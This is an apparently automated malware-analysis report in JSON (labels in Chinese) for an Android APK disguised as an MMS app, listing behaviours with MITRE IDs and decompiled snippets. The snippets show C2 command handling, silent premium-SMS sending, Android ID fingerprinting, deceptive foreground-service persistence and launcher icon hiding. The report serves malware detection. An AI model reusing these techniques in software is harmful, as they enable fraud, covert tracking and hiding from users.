@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "a8352f93f7c23953a6deeace67205216c1d37d7f8f6207147d7b93cf272fca9c.apk",
+    "sha256": "a8352f93f7c23953a6deeace67205216c1d37d7f8f6207147d7b93cf272fca9c",
+    "包名": "ru.egg.floor",
+    "应用名": "MМС - Пoслaние",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 149.9
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\egg\\floor\\CoupleFashion;",
+          "method_signature": "if(a(jSONObject, 1, 1, \"\", \"\", \"\")",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (i == 40) { a(jSONObject.getString(\"text\")); } if (a(jSONObject, 1, 1, \"\", \"\", \"\")) { new c(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(i3)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a(); }",
+          "malicious_code_snippet_context": "if (i == 40) { a(jSONObject.getString(\"text\")); } if (a(jSONObject, 1, 1, \"\", \"\", \"\")) { new c(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(i3)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a(); }",
+          "behavior_description": "代码从远程C2服务器接收JSON格式的命令响应(jSONObject)，解析命令编号(i)和文本字段，当命令编号为40时执行对应操作。随后通过c类构造网络请求，将命令ID、命令类型、执行状态(status)和返回数据(data)组装后发送回C2服务器，形成完整的远程控制双向通信闭环：接收指令→执行→回报结果。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\egg\\floor\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              SpySwarm.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互。目标号码(str)和短信内容(str2)均由外部参数传入，发送前还调用了 SpySwarm.a(true) 激活间谍模块。异常被静默捕获并忽略，表明代码试图隐藏发送失败。此行为典型用于高级短信欺诈（向付费号码发送短信导致用户扣费）、短信垃圾邮件群发或通过短信进行C2通信和数据外泄。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\egg\\floor\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 9964) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 获取设备的 Android ID（设备唯一标识符），用于设备指纹采集。Android ID 是一种持久化的设备标识，可跨应用追踪用户。在已确认的恶意样本中，此标识符通常会被收集后上传至C2服务器或用于构建设备指纹画像，以实现用户追踪或定向攻击。数据流向：Settings.Secure.getString(context.getContentResolver(), \"android_id\") → 返回给调用方（后续可能被拼接上传）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\egg\\floor\\PledgeHomosexual;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"ru.egg.floor.LEASH\", \"Topple\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.egg.floor.LEASH\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setContentTitle(\"Ocновной прoцесc\").setContentText(\"Систeмa нe кoрректнo рaбoтaeт, вам нeoбхoдимо включить дocтуп к cтaтистикe для 'Ocновной прoцесc'\");\nstartForeground(1417, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"ru.egg.floor.LEASH\", \"Topple\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.egg.floor.LEASH\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocновной прoцесc\").setContentText(\"Систeмa нe кoрректнo рaбoтaeт, вам нeoбхoдимо включить дocтуп к cтaтистикe для 'Ocновной прoцесc'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1417, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "代码通过创建通知渠道并构建带有误导性俄文标题和内容的通知，调用 startForeground 方法将服务提升为前台服务，从而实现应用保活，防止被系统杀死，以便在后台持续执行恶意逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\egg\\floor\\Self;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Self.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class Self extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Self.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate中调用a()方法，通过setComponentEnabledSetting将自身组件状态设为DISABLED（参数值为2），使应用图标从启动器中隐藏，随后调用finish()销毁当前Activity。这是恶意软件常用的隐蔽驻留手法，用户无法在桌面看到应用图标，难以发现和卸载恶意应用，为后续恶意行为（如后台窃取隐私、发送短信等）提供隐蔽环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
